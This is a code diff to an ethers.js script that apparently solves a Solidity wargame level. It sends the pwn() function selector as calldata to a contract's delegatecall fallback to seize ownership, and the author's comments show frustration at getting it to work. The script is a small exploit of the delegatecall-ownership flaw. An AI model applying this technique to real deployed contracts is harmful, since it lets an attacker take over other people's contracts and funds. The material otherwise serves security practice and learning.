@@ -24,12 +24,13 @@ async function main() {
   console.log(
     await signer.sendTransaction({
       from: PLAYER_ADDRESS,
-      to: DELEGATE_CONTRACT,
+      to: CONTRACT_ADDRESS,
       value: 0,
       gasLimit: 50000,
-      data: await ethers.utils.keccak256("pwn()"), //This is the line of code that is driving me insane
+      data: "0xdd365b8b", //This is the line of code that is driving me insane
     })
   );
+  console.log(await contractDelegate.owner());
   // Check the contract address
   // console.log(
   //   "what is the contract address of the delegate contract? ",
@@ -40,13 +41,14 @@ async function main() {
   //   "What is the contract address of the delegation contract? ",
   //   await contractDelegate.address
   // );
-
+  // await contractDelegate.pwn()).data this is the key here
   // Trigger the fallback function of delegation
+  // const data = 0xdd365b8b;
   // console.log(
   //   "trigger delegation fallback",
   //   await contractDelegation.fallback({
   //     value: 0,
-  //     data: ethers.utils.keccak256("pwn()"),
+  //     data: "0xdd365b8b",
   //   })
   // );
 
